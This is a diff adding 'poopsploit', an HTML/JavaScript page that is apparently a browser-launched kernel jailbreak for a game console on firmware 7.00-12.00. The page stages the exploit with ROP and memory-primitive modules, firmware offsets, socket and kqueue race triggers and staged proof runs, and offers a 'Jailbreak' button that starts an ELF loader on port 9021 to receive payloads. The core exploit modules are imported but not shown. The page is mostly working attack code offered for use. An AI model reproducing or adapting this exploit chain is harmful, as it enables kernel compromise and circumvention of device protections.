@@ -1,0 +1,2714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>poopsploit</title>
+<link rel="preload" href="cat.jpg" as="image">
+<link rel="preload" href="mmhmm-cats-ps5.gif" as="image">
+
+<script>(function () {
+    var pending = [];
+    window.__jbEarly = pending;
+    function raw(tag, text) {
+        var line = "a0-rboot-s" + (pending.length + 1) + "-note-" + tag
+            + "-" + String(text).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 160);
+        pending.push(line);
+        try {
+            var d = document.getElementById("early");
+            if (d) d.textContent += line + "\n";
+        } catch (e) { }
+    }
+    window.__jbRaw = raw;
+    window.alert = function (m) { raw("ALERT-INTERCEPTED", m); };
+    window.confirm = function (m) { raw("CONFIRM-INTERCEPTED", m); return false; };
+    window.addEventListener("error", function (e) {
+        raw("WINDOW-ERROR", (e && e.message) + "@" + (e && e.filename)
+            + ":" + (e && e.lineno));
+    });
+    window.addEventListener("unhandledrejection", function (e) {
+        raw("UNHANDLED-REJECTION",
+            e && e.reason && (e.reason.message || e.reason));
+    });
+})();
+</script>
+
+<style>
+  html, body { margin: 0; padding: 0; min-height:100%;
+    background: radial-gradient(circle at 50% 28%, #18233a 0, #0c111b 44%, #07090e 100%);
+    color: #d8dee9; }
+  body { box-sizing:border-box; min-height:100vh;
+    font: 22px/1.35 "Consolas", "DejaVu Sans Mono", monospace;
+    padding: 24px 20px; display:flex; flex-direction:column;
+    align-items:center; justify-content:center; }
+  h1 { font-size: 30px; margin: 0 0 2px; color: #eceff4; font-weight: 600; }
+  .sub { font-size: 18px; color: #7c8795; margin: 0 0 12px; }
+  #stage { font-size: 24px; padding: 9px 13px; border-radius: 6px;
+           margin-bottom: 12px; background: #1b2430; border-left: 8px solid #5e81ac; }
+  #stage.ok  { background: #16281c; border-left-color: #47c76a; color: #b8f0c6; }
+  #stage.bad { background: #1b2430; border-left-color: #5e81ac; color: #d8dee9; }
+  #danger, #reboot, #verdict { display:none !important; }
+
+  #reboot { display: none; font-size: 34px; font-weight: 800; padding: 20px 18px;
+            margin-bottom: 14px; border-radius: 8px; background: #4a0d10;
+            border: 5px solid #ff5566; color: #ffe3e6; white-space: pre-wrap;
+            line-height: 1.25; }
+  #reboot.on { display:none; }
+  #reboot.fine { display:none; }
+
+  #verdict { display: none; font-size: 26px; font-weight: 700; padding: 16px 18px;
+             margin-bottom: 14px; border-radius: 8px; background: #101a26;
+             border: 4px solid #6d7788; color: #dfe7f0; white-space: pre-wrap;
+             line-height: 1.3; }
+  #verdict.on   { display:none; }
+  #verdict.good { background: #0f2c17; border-color: #47c76a; color: #d4f7de; }
+  #verdict.bad  { background: #101a26; border-color: #6d7788; color: #dfe7f0; }
+  #verdict.warn { background: #2e2413; border-color: #ebcb8b; color: #f6e6bd; }
+  #vitals { display: none; font-size: 24px; padding: 10px 14px; margin-bottom: 12px;
+            border-radius: 6px; background: #17212e; border-left: 8px solid #ebcb8b;
+            color: #e8dcb6; white-space: pre-wrap; }
+  #vitals.on { display: block; }
+  #cfg { font-size: 22px; color: #9fb1c3; background: #131922; padding: 10px 13px;
+         border-radius: 6px; margin-bottom: 12px; white-space: pre-wrap; }
+  #scr, #early { font-size: 15px; color: #6d7788; margin: 0 0 10px;
+                 white-space: pre; overflow: hidden; min-height: 1.3em; }
+  #nav { display:none !important; margin: 0 0 14px; }
+  #nav a { display: inline-block; margin: 0 12px 8px 0; padding: 10px 18px;
+           background: #1b2430; border: 2px solid #3b4756; border-radius: 6px;
+           color: #d8dee9; text-decoration: none; font-size: 20px; }
+  #nav a.primary { border-color: #5e81ac; background: #223146; color: #cfe3ff; }
+  #nav a.hot { border-color: #52647c; background: #202d40; color: #dce8f7; }
+
+  #nav a.one { display: block; font-size: 30px; font-weight: 700;
+               padding: 20px 26px; margin: 0 0 12px;
+               border-color: #5e81ac; background: #223146; color: #cfe3ff; }
+  #nav a.one.hot { border-color: #52647c; background: #202d40; color: #dce8f7; }
+
+  body.quiet #nav a.extra { display: none; }
+  #nav a:focus { outline: 3px solid #ebcb8b; }
+  #arm { font-size: 26px; padding: 24px 6px; color: #ebcb8b; }
+  #wrap { overflow-x: auto; }
+  table { border-collapse: collapse; width: 100%; min-width: 640px; }
+  thead th { position: sticky; top: 0; background: #131922; color: #8fa1b3;
+             text-align: left; font-size: 17px; padding: 8px 10px;
+             border-bottom: 2px solid #2a3340; z-index: 2; }
+  td { padding: 9px 10px; vertical-align: top; border-bottom: 1px solid #1d232c; }
+  td.n  { width: 2.6em; color: #55606e; font-size: 17px; }
+  td.k  { width: 12em; color: #cfd8e3; font-weight: 700; }
+  td.k .cls { display: block; color: #61708a; font-weight: 400; font-size: 15px; }
+  td.st { width: 4.6em; font-weight: 700; font-size: 25px; }
+  td.st.PASS { color: #47c76a; }
+  td.st.FAIL { color: #cfd8e3; }
+  td.st.SKIP { color: #8f7a3f; }
+  td.st.RUN  { color: #ebcb8b; }
+  td.d { color: #aeb8c6; font-size: 19px; word-break: break-word;
+         white-space: pre-wrap; }
+  td.d .why  { color: #aeb8c6; }
+  td.d .note { color: #7fb7d4; display: block; font-size: 17px; }
+  td.d .pu   { color: #6b7a8c; display: block; font-size: 15px; margin-top: 3px; }
+  td.d .ev   { color: #5a6472; display: block; font-size: 15px; margin-top: 3px; }
+  #tally { margin-top: 18px; font-size: 30px; font-weight: 700; }
+  #summary { margin-top: 10px; font-size: 20px; color: #9fb1c3;
+             white-space: pre-wrap; }
+
+  #dt { position: fixed; top: 10px; right: 12px; z-index: 9;
+        font: 700 18px ui-monospace, Menlo, Consolas, monospace;
+        padding: 10px 16px; border-radius: 6px; cursor: pointer;
+        background: #1b2430; border: 2px solid #3b4756; color: #9fb1c3; }
+  #dt:focus { outline: 3px solid #ebcb8b; }
+  body.quiet #dt { color: #61708a; }
+
+  body.quiet h1,
+  body.quiet .sub,
+  body.quiet #cfg,
+  body.quiet #summary,
+  body.quiet #tally,
+  body.quiet #wrap,
+  body.quiet #early,
+  body.quiet #vitals,
+  body.quiet #verdict,
+  body.quiet #danger,
+  body.quiet #stage,
+  body.quiet td.d .pu,
+  body.quiet td.d .ev                     { display: none; }
+
+  body.quiet #reboot { font-size: 26px; }
+
+  body.quiet #scr {
+        box-sizing: border-box; width:88vw; max-width:680px; height:150px;
+        overflow: auto; font-size: 14px; line-height: 1.3; color: #b8c4d2;
+        background: rgba(12,18,28,.88); border: 1px solid #344258;
+        box-shadow: 0 18px 42px rgba(0,0,0,.34), inset 0 1px rgba(255,255,255,.04);
+        border-radius: 14px; padding: 13px 15px; margin: 10px auto 0; }
+
+  body.quiet tr:not(.r-FAIL) td.d .note   { display: none; }
+
+  body.quiet tr:not(.r-FAIL) td.d > span:first-child {
+        display: -webkit-box; display: box; overflow: hidden;
+        -webkit-line-clamp: 1; -webkit-box-orient: vertical; }
+
+  body.quiet #stage { font-size: 34px; }
+
+  #cat { box-sizing:border-box; display:block; margin:0 auto 12px;
+         width:150px; height:150px; max-width:34vw; max-height:34vw;
+         border:4px solid #343c49; border-radius:18px;
+         box-shadow:0 24px 70px rgba(0,0,0,.5); overflow:hidden; }
+  #cat img { display:block; width:100%; height:100%; object-fit:cover; }
+  #cat.ok  { border-color:#16c60c; }
+  #cat.bad { border-color:#e74856; }
+  #failureMessage { display:none; margin:0 auto 12px; color:#ff6473;
+    font-size:25px; font-weight:800; text-align:center; letter-spacing:.02em; }
+  #failureMessage.on { display:block; }
+
+  #main-content {
+    position:relative; min-width:0; min-height:0; width:100%; height:100%;
+    overflow:hidden; box-sizing:border-box;
+  }
+  #main-content > .app-view {
+    position:absolute; top:0; left:0; width:100%; height:100%;
+    box-sizing:border-box; opacity:0; pointer-events:none;
+    transition:opacity .3s ease-in-out;
+  }
+  #main-content > .app-view.selected {
+    opacity:1 !important; pointer-events:auto !important;
+  }
+  #console-view {
+    display:flex; flex-direction:column; align-items:stretch; overflow:hidden;
+  }
+  #payloads-view {
+    display:grid !important; grid-template-rows:auto 1fr;
+    overflow:hidden; background:#0c0c0f; color:#fff;
+  }
+  #prompt-view {
+    display:flex; align-items:center; justify-content:center;
+    overflow:hidden; background:#0c0c0f; color:#fff;
+  }
+  .payloadHeader {
+    position:relative; box-sizing:border-box; min-height:112px;
+    padding:.5rem; text-align:center;
+  }
+  .payloadHeader h2 {
+    margin:.35rem 0; color:#fff; font-size:2rem; line-height:1.2;
+  }
+  .payloadEyebrow { color:#ccc; font-size:1rem; }
+  .payloadHeader p { margin:0; color:#ccc; font-size:.9rem; }
+  .homeLink {
+    position:absolute; top:.75rem; right:1rem; padding:.5rem 1rem;
+    border-radius:1rem; color:#fff; background:#202125;
+    text-decoration:none; font-size:1rem;
+  }
+  .homeLink:hover, .homeLink:focus {
+    outline:0; background:#a2a2a6; color:#202020;
+  }
+
+  #payloads-view .payloadGrid {
+    display:grid !important;
+    grid-template-columns:repeat(2,minmax(0,1fr));
+    grid-auto-rows:auto;
+    column-gap:2.5rem;
+    row-gap:1rem;
+    width:100%;
+    height:auto; min-height:0;
+    padding:0 2rem 2rem 2rem;
+    overflow-y:scroll;
+    overflow-x:hidden;
+    box-sizing:border-box;
+    align-content:start;
+  }
+  #payloads-view .btn {
+    display:inline-block;
+    box-sizing:border-box;
+    width:100%;
+    min-width:5rem;
+    margin:.2rem;
+    padding:1rem 2rem;
+    border:0;
+    border-radius:1.25rem;
+    background:#202125;
+    color:#fff;
+    cursor:pointer;
+    line-height:2.5rem;
+    text-align:center;
+    text-decoration:none;
+    font-size:1.3rem;
+  }
+  #payloads-view .btn:hover, #payloads-view .btn:focus {
+    outline:0;
+    background:#a2a2a6;
+    color:#202020;
+  }
+  .payload-btn-title {
+    display:block !important;
+    visibility:visible !important;
+    opacity:1 !important;
+    margin:0;
+    padding:0;
+    color:#fff !important;
+    -webkit-text-fill-color:#fff;
+    line-height:2.5rem;
+    font-size:1.3rem;
+    font-weight:bolder;
+  }
+  .payload-btn-description {
+    display:block !important;
+    visibility:visible !important;
+    opacity:1 !important;
+    max-width:100%;
+    margin:0;
+    padding:0;
+    overflow:hidden;
+    color:#ccc;
+    -webkit-text-fill-color:#ccc;
+    text-overflow:ellipsis;
+    white-space:nowrap;
+    line-height:2rem;
+    font-size:1rem;
+  }
+  .btn:hover .payload-btn-description,
+  .btn:focus .payload-btn-description {
+    color:#444 !important; -webkit-text-fill-color:#444;
+  }
+  .payload-btn-info {
+    display:block !important;
+    visibility:visible !important;
+    opacity:1 !important;
+    margin:0;
+    padding:0;
+    overflow:hidden;
+    color:#999;
+    -webkit-text-fill-color:#999;
+    text-overflow:ellipsis;
+    line-height:1.5rem;
+    font-size:.9rem;
+    font-weight:normal;
+  }
+  .btn:hover .payload-btn-info,
+  .btn:focus .payload-btn-info {
+    color:#555 !important; -webkit-text-fill-color:#555;
+  }
+  #payloads-view .btn:hover .payload-btn-title,
+  #payloads-view .btn:focus .payload-btn-title {
+    color:#202020 !important; -webkit-text-fill-color:#202020;
+  }
+  #payloads-view .btn.busy { opacity:.45; pointer-events:none; }
+
+  #loaderPrompt {
+    display:block; width:70%; max-width:760px; margin:0; padding:2rem;
+    box-sizing:border-box;
+    text-align:center; color:#fff;
+  }
+  .promptBadge { display:none; }
+  #loaderPrompt h2 { margin:0; color:#fff; font-size:2rem; }
+  #loaderPrompt p { margin:10px auto 24px; max-width:470px; color:#ccc; font-size:1rem; }
+  .promptActions { display:block; text-align:center; }
+  .promptButton {
+    display:inline-block; box-sizing:border-box; width:50%; min-width:5rem;
+    margin:.2rem; padding:1rem 2rem; border:0; border-radius:1.25rem;
+    background:#202125; color:#fff; line-height:2.5rem;
+    text-decoration:none; font-size:1.3rem; font-weight:800;
+  }
+  .promptButton.secondary { padding:.5rem 2rem; font-size:1rem; }
+  .promptButton:hover, .promptButton:focus {
+    outline:0; background:#a2a2a6; color:#202020;
+  }
+
+  #payloadToastContainer { position:fixed; top:20px; right:20px; z-index:9999; }
+  .payloadToast {
+    width:300px; margin-top:10px; padding:20px 25px; border-radius:1rem;
+    background:#15161a; color:#fff; box-shadow:0 0 10px rgba(0,0,0,.2);
+    opacity:1; transition:opacity .4s; pointer-events:none;
+    font:16px/1.35 Arial,sans-serif;
+  }
+  .payloadToast.hide { opacity:0; }
+
+  #poopsploitHeader, #poopsploitFooter { display:block; }
+  body.quiet { display:grid;
+    grid-template-rows:auto 1fr auto; width:100%; height:100vh; padding:0; margin:0;
+    overflow:hidden; align-items:stretch; justify-content:stretch;
+    background:#0c0c0f; color:#fff; font-family:Arial,sans-serif; }
+  body.quiet.payload-view-active { grid-template-rows:1fr auto; }
+  body.quiet.payload-view-active #poopsploitHeader { display:none; }
+  body.quiet #poopsploitHeader {
+    display:block; padding:.5rem; text-align:center; }
+  body.quiet #poopsploitHeader h1 {
+    display:block; margin:.5rem 0; color:#fff; font-size:2rem; font-weight:bold; }
+  body.quiet #poopsploitHeader p {
+    margin:.25rem 0; color:#ccc; font-size:1rem; }
+  body.quiet #cat { display:none; }
+  body.quiet #scr { display:block;
+    box-sizing:border-box; width:auto; max-width:none; height:auto; min-height:0; flex:1;
+    margin:8px; padding:8px; overflow-y:auto; overflow-x:hidden;
+    border:1px solid #202125; border-radius:5px; background:inherit;
+    box-shadow:none; color:#fff; font:16px/1.35 monospace; white-space:pre-wrap; }
+  body.quiet #poopsploitFooter {
+    display:block; padding:.5rem; color:#ccc; text-align:center; font-size:.8rem; }
+
+  #wrap { display:none !important; }
+</style>
+</head>
+<body class="quiet">
+<div id="poopsploitHeader">
+  <h1>poopsploit (7.00-12.00)</h1>
+  <p>Current firmware: <b id="currentFirmware">detecting...</b></p>
+</div>
+<div id="main-content">
+  <div id="console-view" class="app-view selected">
+    <div id="failureMessage">UNLUCKY &mdash; YOU NEED TO REBOOT</div>
+    <div id="cat">
+      <img id="catImage" src="mmhmm-cats-ps5.gif" alt="">
+    </div>
+    <h1>poops</h1>
+    <div id="reboot"></div>
+    <div id="verdict"></div>
+    <div id="danger"></div>
+    <div id="stage">idle</div>
+    <div id="vitals"></div>
+    <div id="cfg"></div>
+    <pre id="early"></pre>
+    <pre id="scr"></pre>
+    <div id="nav"></div>
+    <div id="arm" hidden>Open this page with <b>?go=1</b> to arm it. Nothing runs
+    otherwise.</div>
+    <div id="wrap">
+      <table>
+        <thead><tr><th>#</th><th>test</th><th>st</th><th>result</th></tr></thead>
+        <tbody id="rows"></tbody>
+      </table>
+    </div>
+    <div id="tally"></div>
+    <div id="summary"></div>
+  </div>
+  <div id="payloads-view" class="app-view">
+    <div class="payloadHeader">
+      <h2 id="payloadViewTitle">poopsploit Payloads (7.00-12.00)</h2>
+      <div class="payloadEyebrow" id="payloadNetworkStatus">Listening on console port 9021</div>
+      <p id="payloadProgress">Select a payload to send it to the ELF loader.</p>
+      <a class="homeLink" href="../index.html">Home</a>
+    </div>
+    <div class="payloadGrid"></div>
+  </div>
+<script>
+/* SITE IDENTITY - the ONE place this site names itself.
+   The ELF page used to carry another project's name and firmware range because the view
+   was ported verbatim; filling the header from these two constants means a copied file
+   can never silently advertise the wrong thing again. build_p2jb_idle.py rewrites
+   SITE_NAME when it regenerates the idle pair. Nothing here depends on the host, so it
+   is correct served from a LAN box or from a static site. */
+var SITE_NAME = "poopsploit";
+var SITE_FW   = "7.00-12.00";
+(function () {
+    try {
+        var h = document.getElementById("payloadViewTitle");
+        if (h) h.textContent = SITE_NAME + " Payloads (" + SITE_FW + ")";
+    } catch (e) { }
+    try { document.title = SITE_NAME; } catch (e) { }
+})();
+</script>
+  <div id="prompt-view" class="app-view">
+    <div id="loaderPrompt">
+      <div class="promptBadge">9021</div>
+      <h2>ELF loader is not running</h2>
+      <p>Port 9021 is not open. Would you like to run the jailbreak now and start the ELF loader?</p>
+      <div class="promptActions">
+        <a id="promptJailbreak" class="promptButton" href="#">Jailbreak</a>
+        <a class="promptButton secondary" href="../index.html">Cancel</a>
+      </div>
+    </div>
+  </div>
+</div>
+<div id="payloadToastContainer"></div>
+<div id="poopsploitFooter">poopsploit final</div>
+
+<div id="console" hidden></div>
+
+<script src="rop.js?v=lowfw17"></script>
+<script src="main.js?v=lowfw17"></script>
+<script>window.offsetsReady = new Promise(function (res, rej) {
+    var s = document.querySelector('script[src^="../offsets/"]');
+    if (!s) return rej(new Error("offsets script was never injected by main.js"));
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
+    s.addEventListener("load", function () { res(s.src); });
+    s.addEventListener("error", function () {
+        rej(new Error("offsets 404: " + s.src));
+    });
+});
+</script>
+<script src="syscalls.js"></script>
+
+<script type="module">import { establishPrimitive, fakeCellReleased, CORE_INSTANCE } from "./core.js?v=lowfw17";
+import { installWindowP, pairStatus, MEM_SEES_CORE } from "./mem.js?v=lowfw17";
+import { int64 } from "./int64.js";
+
+let BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList;
+
+// Fail LOUDLY on a module-version split. core.js keeps the entire primitive in
+// module-level `let`s; if this page and mem.js import different core.js URLs they get
+// separate copies, establishPrimitive() fills one and mem.js reads the other, and the
+// only symptom is "pair was NOT promoted / mem: bad numeric address NaN". That cost six
+// runs on retail 12.00 on 2026-08-27, because THIS page had no guard. Keep EVERY module
+// version in lockstep: the page, index.html AND the hardcoded core.js import in mem.js.
+// tools/site_check.py now fails offline when they disagree.
+if (CORE_INSTANCE !== MEM_SEES_CORE) {
+    const msg = "MODULE SPLIT: mem.js imported a different core.js than this page."
+        + " page=" + CORE_INSTANCE.url + "  mem.js=" + MEM_SEES_CORE.url
+        + " -- bump every module version together.";
+    try { window.syncMark && window.syncMark("MODULE-SPLIT", msg); } catch (e) {}
+    throw new Error(msg);
+}
+
+let PK = null, makePoopsEngine = null, buildLadder = null;
+
+async function loadPoopsModules() {
+    await window.offsetsReady;
+    const firmwareLabel = document.getElementById("currentFirmware");
+    if (firmwareLabel) firmwareLabel.textContent = window.fw_str || "unknown";
+    const lib = await import("./poops.js?v=lowfw17");
+    BANNED = lib.BANNED;
+    ERRNO = lib.ERRNO;
+    K = lib.K;
+    r32 = lib.r32;
+    r16 = lib.r16;
+    w32 = lib.w32;
+    hexBytes = lib.hexBytes;
+    coreList = lib.coreList;
+    PK = lib.PK;
+    makePoopsEngine = lib.makePoopsEngine;
+    buildLadder = lib.buildLadder;
+    if (!PK
+        || typeof PK.LK_PTHREAD_CREATE_NAME_NP !== "number"
+        || PK.LK_PTHREAD_CREATE_NAME_NP < 0
+        || typeof PK.LK_PTHREAD_JOIN !== "number"
+        || PK.LK_PTHREAD_JOIN < 0) {
+        throw new Error("firmware " + window.fw_str
+            + " profile loaded without pthread offsets: create="
+            + (PK && PK.LK_PTHREAD_CREATE_NAME_NP) + ", join="
+            + (PK && PK.LK_PTHREAD_JOIN));
+    }
+    flushMark("POOPS-MODULES-LOADED", "deferred-until-after-primitive-fw="
+        + window.fw_str + "-pthreadCreateOff=0x"
+        + (PK.LK_PTHREAD_CREATE_NAME_NP >>> 0).toString(16)
+        + "-pthreadJoinOff=0x" + (PK.LK_PTHREAD_JOIN >>> 0).toString(16));
+}
+
+const Q = new URLSearchParams(location.search);
+const LOG_DEBUG = Q.get("log") === "debug";
+const ARMED = Q.get("go") === "1";
+const CLEARLATCH = Q.get("clear") === "1";
+const CHECKPOINT = Q.get("checkpoint") === "1";
+const STAGE0_PROOF = Q.get("proof") === "stage0";
+const STAGE1_PROOF = Q.get("proof") === "stage1";
+const STAGE2_PROOF = Q.get("proof") === "stage2";
+const STAGE3_PROOF = Q.get("proof") === "stage3";
+const STAGE4_PROOF = Q.get("proof") === "stage4";
+const STAGE5_DRY_PROOF = Q.getAll("proof").length === 1
+    && Q.get("proof") === "stage5dry";
+const STAGE5_LIVE_PROOF = Q.getAll("proof").length === 1
+    && Q.get("proof") === "stage5live";
+const PROOF = STAGE5_LIVE_PROOF ? "stage5live"
+    : STAGE5_DRY_PROOF ? "stage5dry"
+        : STAGE4_PROOF ? "stage4" : STAGE3_PROOF ? "stage3"
+            : STAGE2_PROOF ? "stage2" : STAGE1_PROOF ? "stage1"
+                : STAGE0_PROOF ? "stage0" : "";
+const PROOF_TITLE = PROOF === "stage5live" ? "Stage 5 live"
+    : PROOF === "stage5dry" ? "Stage 5 dry"
+        : (PROOF ? "Stage " + PROOF.slice(5) : "");
+
+const AUTOCLEAR = Q.get("auto") === "1";
+const FROM = Q.get("from") || "";
+const ONLY = (Q.get("only") || "").split(",").map(s => s.trim()).filter(Boolean);
+const FILTERED_RUN = ONLY.length > 0 || FROM !== "";
+const MAX_ATTEMPTS = parseInt(Q.get("max") || "0", 10) || 0;
+const CORE_OVERRIDE = Q.has("core") ? parseInt(Q.get("core"), 10) : -1;
+const REUSE_ELFLDR = Q.get("reuse") === "1";
+
+const PROGRESS_KEY = "poopsploit-poops:next";
+const RUNLOG_KEY = "poopsploit-poops:last";
+const ROUTE_VERSION = "lowfw17";
+const REV = "poopsploit-poops-final";
+const CHECKPOINT_ONLY = "ps0_preflight,ps1_prepare,ps3_stage0";
+const STAGE5_ONLY = "ps0_preflight,ps1_prepare,ps3_stage0,ps4_validate,"
+    + "ps5_stage1,ps6_stage2,ps8_stage3,ps9_stage4,ps10_stage5";
+const STAGE5_FIRMWARES = Object.freeze([
+    "7.00", "7.01", "7.20", "7.40", "7.60", "7.61",
+    "8.00", "8.20", "8.40", "8.60",
+    "9.00", "9.05", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
+    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"
+]);
+
+function storeGet(k) {
+    try { return sessionStorage.getItem(k) || ""; } catch { return ""; }
+}
+function storeSet(k, v) { try { sessionStorage.setItem(k, v); } catch { } }
+function storeDel(k) { try { sessionStorage.removeItem(k); } catch { } }
+function consumeStored(k) {
+    try {
+        sessionStorage.removeItem(k);
+        return sessionStorage.getItem(k) === null;
+    } catch (e) {
+        return false;
+    }
+}
+function storeJson(k) {
+    const raw = storeGet(k);
+    if (!raw) return null;
+    try { return JSON.parse(raw); } catch { return null; }
+}
+let STALLED_AT = storeGet(PROGRESS_KEY);
+let LAST_RUN = storeJson(RUNLOG_KEY);
+
+const TRIGGER = (() => {
+    const t = (Q.get("trigger") || "none").toLowerCase();
+    return (t === "netcontrol" || t === "overflow") ? t : "none";
+})();
+const BURN = (() => {
+    const b = (Q.get("burn") || "probe").toLowerCase();
+    return (b === "none" || b === "full") ? b : "probe";
+})();
+const DEFAULT_ATTEMPTS = TRIGGER === "overflow" ? 96
+    : TRIGGER === "netcontrol" ? 8 : 1;
+
+const cfg = {
+
+    payload: Q.get("payload") || "",
+    trigger: TRIGGER,
+    burn: BURN,
+    netprobe: Q.get("netprobe") === "1",
+    sockets: Math.max(4, Math.min(128,
+        parseInt(Q.get("sockets") || "", 10) || 80)),
+    attempts: Math.max(1, Math.min(512,
+        parseInt(Q.get("attempts") || "", 10) || DEFAULT_ATTEMPTS)),
+    kqBatch: Math.max(1, Math.min(32, parseInt(Q.get("kqbatch") || "", 10) || 8)),
+    kqRounds: Math.max(8, Math.min(50000,
+        parseInt(Q.get("kqrounds") || "", 10) || 5000)),
+    kqConfirm: Q.get("noconfirm") !== "1",
+    burnRounds: Math.max(1, Math.min(100000,
+        parseInt(Q.get("burnrounds") || "", 10) || 20)),
+    burnUnroll: Math.max(1, Math.min(512,
+        parseInt(Q.get("burnunroll") || "", 10) || 512)),
+
+    twinDeadlineMs: 20000,
+    reclaimDeadlineMs: 30000,
+    tripletDeadlineMs: 30000,
+    repairDeadlineMs: 30000,
+    stage0DeadlineMs: Math.max(30000, Math.min(900000,
+        parseInt(Q.get("stage0deadline") || "", 10) || 300000)),
+    stage1DeadlineMs: 120000,
+    stage2Attempts: 5,
+
+    stage2DeadlineMs: Math.max(60000, Math.min(3600000,
+        parseInt(Q.get("stage2deadline") || "", 10) || 900000))
+};
+
+const STAGE5_DRY_QUERY = Object.freeze({
+    go: "1", trigger: "netcontrol", attempts: "8", only: STAGE5_ONLY,
+    log: "debug", proof: "stage5dry", payload: "dry", v: ROUTE_VERSION
+});
+const STAGE5_LIVE_QUERY = Object.freeze({
+    go: "1", trigger: "netcontrol", attempts: "8", only: STAGE5_ONLY,
+    log: "debug", proof: "stage5live", payload: "1", v: ROUTE_VERSION
+});
+const PRODUCTION_QUERY = Object.freeze({
+    go: "1", auto: "1", production: "1", trigger: "netcontrol",
+    attempts: "8", only: STAGE5_ONLY, log: "debug", payload: "1",
+    v: ROUTE_VERSION
+});
+const PRODUCTION_HREF = "poops.html?" + Object.keys(PRODUCTION_QUERY)
+    .map(key => encodeURIComponent(key) + "="
+        + encodeURIComponent(PRODUCTION_QUERY[key]))
+    .join("&");
+const REUSE_QUERY = Object.freeze({
+    go: "1", auto: "1", production: "1", trigger: "netcontrol",
+    attempts: "8", only: STAGE5_ONLY, log: "debug", payload: "1",
+    reuse: "1", v: ROUTE_VERSION
+});
+const STAGE5_INTENT = Q.has("stage5") || Q.has("payload")
+    || Q.getAll("proof").some(value => value.indexOf("stage5") === 0)
+    || Q.getAll("only").some(value => value.split(",")
+        .some(key => key.trim() === "ps10_stage5"));
+
+function exactQuery(expected) {
+    const keys = Object.keys(expected);
+    let count = 0, exact = true;
+    Q.forEach((value, key) => {
+        count++;
+        if (!Object.prototype.hasOwnProperty.call(expected, key)
+            || expected[key] !== value) exact = false;
+    });
+    return exact && count === keys.length
+        && keys.every(key => Q.getAll(key).length === 1);
+}
+
+const STAGE5_REQUEST_ERROR = (() => {
+    if (!STAGE5_INTENT) return "";
+    if (!exactQuery(STAGE5_DRY_QUERY) && !exactQuery(STAGE5_LIVE_QUERY)
+        && !exactQuery(PRODUCTION_QUERY) && !exactQuery(REUSE_QUERY))
+        return "noncanonical-stage5-request";
+    return STAGE5_FIRMWARES.indexOf(window.fw_str) >= 0
+        ? "" : "unsupported-stage5-firmware";
+})();
+
+const PRODUCTION_REQUEST_ERROR = (() => {
+    if (!Q.has("production") && !Q.has("auto") && !Q.has("next")) return "";
+    return exactQuery(PRODUCTION_QUERY) || exactQuery(REUSE_QUERY)
+        ? "" : "noncanonical-production-request";
+})();
+const PRODUCTION_RUN = exactQuery(PRODUCTION_QUERY) || exactQuery(REUSE_QUERY);
+
+function cleanNegativeCheckpoint(last) {
+    return last && last.rev === REV && last.checkpoint === true
+        && last.proof === "" && last.filtered === true
+        && last.only === CHECKPOINT_ONLY
+        && last.trigger === "none" && last.pass === 4
+        && last.fail === 0 && last.skip === 0
+        && last.reboot === false && !last.stoppedAt && !last.triggered
+        && !last.corrupt && !last.triplets && !last.setuidCalls
+        && last.socketsLeft === 0 && !last.chainDead && !last.cleanupFailed
+        && last.kernelWrites === 0;
+}
+
+function canRefreshCheckpoint(last) {
+    return ARMED && FILTERED_RUN && TRIGGER === "none" && cfg.attempts === 1
+        && ONLY.join(",") === CHECKPOINT_ONLY
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage0Proof(last) {
+    return STAGE0_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",")
+            === "ps0_preflight,ps1_prepare,ps3_stage0,ps4_validate"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage1Proof(last) {
+    return STAGE1_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",") === "ps0_preflight,ps1_prepare,ps3_stage0,"
+            + "ps4_validate,ps5_stage1"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage2Proof(last) {
+    return STAGE2_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",") === "ps0_preflight,ps1_prepare,ps3_stage0,"
+            + "ps4_validate,ps5_stage1,ps6_stage2"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage3Proof(last) {
+    return STAGE3_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",") === "ps0_preflight,ps1_prepare,ps3_stage0,"
+            + "ps4_validate,ps5_stage1,ps6_stage2,ps8_stage3"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage4Proof(last) {
+    return STAGE4_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",") === "ps0_preflight,ps1_prepare,ps3_stage0,"
+            + "ps4_validate,ps5_stage1,ps6_stage2,ps8_stage3,ps9_stage4"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage5Proof(last, proof, payload) {
+    return !STAGE5_REQUEST_ERROR && proof && ARMED && FILTERED_RUN
+        && STAGE5_FIRMWARES.indexOf(window.fw_str) >= 0
+        && cfg.payload === payload
+        && TRIGGER === "netcontrol" && cfg.attempts === 8
+        && ONLY.join(",") === STAGE5_ONLY
+        && cleanNegativeCheckpoint(last)
+        && last.fw === window.fw_str && last.payload === "";
+}
+
+let elfldrSpawned = false;
+const screenLines = [];
+
+const screenLineLimit = 12;
+const scrEl = document.getElementById("scr");
+
+const clean = s => String(s).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 200);
+
+let raceMode = false;
+let screenDirty = false;
+
+const SCREEN_MS = 250;
+let lastPaint = 0;
+
+const CRITICAL_MARKS = { "TRIGGER-ARMED": 1, "LATCH-ESCALATE": 1 };
+function repaintScreen() {
+    if (!screenDirty) return;
+    screenDirty = false;
+    try {
+        scrEl.textContent = screenLines.join("\n");
+    } catch { }
+}
+function setRaceMode(on) {
+    const was = raceMode;
+    raceMode = !!on;
+    if (was && !raceMode) repaintScreen();
+    return was;
+}
